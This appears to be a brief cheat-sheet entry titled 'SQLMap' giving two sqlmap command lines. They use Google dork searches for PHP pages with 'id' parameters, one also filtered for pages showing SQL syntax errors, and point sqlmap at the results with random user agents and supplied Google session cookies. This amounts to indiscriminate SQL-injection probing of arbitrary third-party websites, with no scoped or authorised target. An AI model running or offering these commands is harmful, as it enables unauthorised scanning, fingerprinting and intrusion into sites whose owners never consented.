# SQLMap

```
$ sqlmap -g "inurl:\".php?id=1\"" --cookies="<google_cookies_session>" -f --random-agent

$ sqlmap -g "inurl:\".php?id=1\" intext:\"You have an error in your SQL syntax\"" --cookies="<google_cookies_session>" --random-agent
```